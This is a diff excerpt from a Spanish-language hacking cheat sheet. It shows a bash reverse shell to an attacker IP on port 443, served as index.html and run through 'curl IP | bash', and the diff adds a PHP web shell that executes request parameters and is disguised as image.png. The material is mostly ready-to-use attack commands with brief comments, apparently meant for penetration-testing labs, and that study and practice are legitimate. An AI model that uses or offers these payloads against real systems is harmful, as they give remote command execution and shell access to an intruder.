@@ -157,13 +157,25 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 
 ```bash
 ❯ nano index.html
+
 	#!/bin/bash
 	bash -i >& /dev/tcp/10.10.14.2/443 0>&1
 
 	# IP = IP de atacante
 	# 443 = Puerto a usar
 
+
 ❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
+```
+
+## Imagen 'png' 
+
+```bash 
+❯ nano image.png
+
+	<?php
+		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+	?>
 ```
 
 ## ReverShell en php:
